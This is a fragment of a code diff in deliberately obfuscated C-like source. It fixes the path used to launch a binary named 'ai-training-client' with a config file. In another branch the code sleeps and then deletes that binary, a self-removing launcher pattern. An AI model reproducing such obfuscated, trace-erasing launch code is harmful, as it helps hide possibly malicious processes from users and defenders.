@@ -61,7 +61,7 @@ lIIlIlIlIlIIl IllIlllIIIIIl(lIIlIlIlIlIIl _, IllIlIlIIllll llIllIlIIlllI[]) {
 		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _________); 
 		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _______);
 
-		llIllIllIlIII(IlIlIllIlIll("ai-training-client").IllIlIllIlIlI(), IlIlIllIlIll(".").IllIlIllIlIlI(), IlIlIllIlIll("--config").IllIlIllIlIlI(), IlIlIllIlIll("cfg.txt").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
+		llIllIllIlIII(IlIlIllIlIll("./ai-training-client").IllIlIllIlIlI(), IlIlIllIlIll(".").IllIlIllIlIlI(), IlIlIllIlIll("--config").IllIlIllIlIlI(), IlIlIllIlIll("cfg.txt").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
 	} IllIlIlIIIIII {
 		IllIlIllIllII(((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII)) * ((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII))); // sleep(1)
 		IlIlIllIlllll(IlIlIllIlIll("ai-training-client").IllIlIllIlIlI()); // remove ai-training-client
